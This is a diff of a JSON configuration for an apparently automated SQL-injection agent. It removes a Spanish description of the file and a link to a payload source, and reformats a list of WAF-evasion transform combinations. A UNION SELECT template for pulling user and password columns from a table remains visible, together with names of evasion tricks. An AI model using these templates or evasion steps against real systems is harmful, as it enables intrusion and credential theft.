@@ -1,8 +1,4 @@
 {
-  "_about": "Plantillas de tecnicas de extraccion SQLi (sintaxis MySQL estandar) y escalera de evasion de WAF. El agente las rellena con el esquema que descubre en vivo ({q},{ucol},{pcol},{table},{i},{ch},{n}); no estan afinadas a ningun objetivo. Los payloads reales viven en datasets/corpus (PayloadsAllTheThings) y las wordlists en datasets/wordlists (sqlmap).",
-  "_sources": [
-    "Sintaxis estandar MySQL (extractvalue/updatexml error-based, substring boolean/time-based), documentada en PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection"
-  ],
   "extraction_techniques": {
     "union": [
       "-1{q} UNION SELECT {ucol},{pcol} FROM {table}-- -",
@@ -23,19 +19,59 @@
   },
   "waf_bypass_ladder": [
     [],
-    ["case"],
-    ["inline_comment"],
-    ["inline_comment", "case"],
-    ["union_all", "case"],
-    ["union_all", "inline_comment", "case"],
-    ["versioned_comment"],
-    ["versioned_comment", "case"],
-    ["term_hash", "inline_comment", "case"],
-    ["whitespace_tab"],
-    ["whitespace_newline"],
-    ["whitespace_tab", "case"],
-    ["union_all", "versioned_comment", "case"],
-    ["double_keyword"],
-    ["double_keyword", "inline_comment", "case"]
+    [
+      "case"
+    ],
+    [
+      "inline_comment"
+    ],
+    [
+      "inline_comment",
+      "case"
+    ],
+    [
+      "union_all",
+      "case"
+    ],
+    [
+      "union_all",
+      "inline_comment",
+      "case"
+    ],
+    [
+      "versioned_comment"
+    ],
+    [
+      "versioned_comment",
+      "case"
+    ],
+    [
+      "term_hash",
+      "inline_comment",
+      "case"
+    ],
+    [
+      "whitespace_tab"
+    ],
+    [
+      "whitespace_newline"
+    ],
+    [
+      "whitespace_tab",
+      "case"
+    ],
+    [
+      "union_all",
+      "versioned_comment",
+      "case"
+    ],
+    [
+      "double_keyword"
+    ],
+    [
+      "double_keyword",
+      "inline_comment",
+      "case"
+    ]
   ]
 }
